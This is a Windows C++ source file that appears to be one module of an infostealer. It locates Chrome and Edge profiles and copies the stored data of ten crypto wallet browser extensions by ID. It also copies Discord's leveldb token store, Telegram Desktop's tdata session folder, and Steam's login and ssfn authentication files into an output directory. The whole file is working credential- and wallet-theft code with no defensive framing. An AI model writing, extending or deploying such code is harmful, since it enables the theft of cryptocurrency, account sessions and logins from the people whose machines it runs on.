#include "wallets.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

static void copy_dir_recursive(const std::wstring& src, const std::wstring& dst) {
    CreateDirectoryW(dst.c_str(), nullptr);
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((src + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring srcFile = src + L"\\" + fd.cFileName;
        std::wstring dstFile = dst + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) copy_dir_recursive(srcFile, dstFile);
        else CopyFileW(srcFile.c_str(), dstFile.c_str(), FALSE);
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

void grab_wallets(const std::wstring& outDir) {
    wchar_t appdata[MAX_PATH], local[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local);
    std::wstring A = appdata, L = local;

    std::vector<std::wstring> extIds = {
        L"nkbihfbeogaeaoehlefnkodbefgpgknn", L"bfnaelmomeimhlpmgjnjophhpkkoljpa",
        L"fhbohimaelbohpjbbldcngcnapndodjp", L"hnfanknocfeofbddgcijnmhnfnkdnaad",
        L"egjidjbpglichdcondbcbdnbeeppgdph", L"jiidiaalihmmhddjgbnbgdfflelocpak",
        L"acmacodkjbdgmoleebolmdjonilkdbch", L"aholpfdialjgjfhomihkjbmgjidlcdno",
        L"dmkamcknogkgcdfhhbddcghachkejeap", L"ejbalbakoplchlghecdalmeeeajnimhm"
    };
    std::vector<std::wstring> bases = {
        A + L"\\Google\\Chrome\\User Data",
        L + L"\\Google\\Chrome\\User Data",
        A + L"\\Microsoft\\Edge\\User Data",
        L + L"\\Microsoft\\Edge\\User Data"
    };
    for (auto& base : bases) {
        if (GetFileAttributesW(base.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW((base + L"\\*").c_str(), &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            std::wstring pn = fd.cFileName;
            if (pn != L"Default" && pn.find(L"Profile") == std::wstring::npos) continue;
            std::wstring les = base + L"\\" + pn + L"\\Local Extension Settings";
            if (GetFileAttributesW(les.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
            for (auto& id : extIds) {
                std::wstring src = les + L"\\" + id;
                if (GetFileAttributesW(src.c_str()) != INVALID_FILE_ATTRIBUTES) copy_dir_recursive(src, outDir + L"\\wallets\\" + id);
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
}

void grab_misc(const std::wstring& outDir) {
    wchar_t appdata[MAX_PATH], local[MAX_PATH], progfiles[MAX_PATH], progfilesx86[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local);
    SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILES, nullptr, 0, progfiles);
    SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILESX86, nullptr, 0, progfilesx86);
    std::wstring A = appdata, L = local, P = progfiles, Px = progfilesx86;

    std::wstring disc = A + L"\\discord\\Local Storage\\leveldb";
    if (GetFileAttributesW(disc.c_str()) != INVALID_FILE_ATTRIBUTES) copy_dir_recursive(disc, outDir + L"\\discord_leveldb");

    std::wstring tg = A + L"\\Telegram Desktop\\tdata";
    if (GetFileAttributesW(tg.c_str()) != INVALID_FILE_ATTRIBUTES) copy_dir_recursive(tg, outDir + L"\\telegram_tdata");

    std::vector<std::wstring> steamPaths = { P + L"\\Steam", Px + L"\\Steam", L + L"\\Steam", A + L"\\Steam" };
    for (auto& sp : steamPaths) {
        if (GetFileAttributesW((sp + L"\\config\\loginusers.vdf").c_str()) != INVALID_FILE_ATTRIBUTES) {
            CopyFileW((sp + L"\\config\\loginusers.vdf").c_str(), (outDir + L"\\steam_loginusers.vdf").c_str(), FALSE);
            CopyFileW((sp + L"\\config\\config.vdf").c_str(), (outDir + L"\\steam_config.vdf").c_str(), FALSE);
            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW((sp + L"\\ssfn*").c_str(), &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do { CopyFileW((sp + L"\\" + fd.cFileName).c_str(), (outDir + L"\\" + fd.cFileName).c_str(), FALSE); } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            break;
        }
    }
}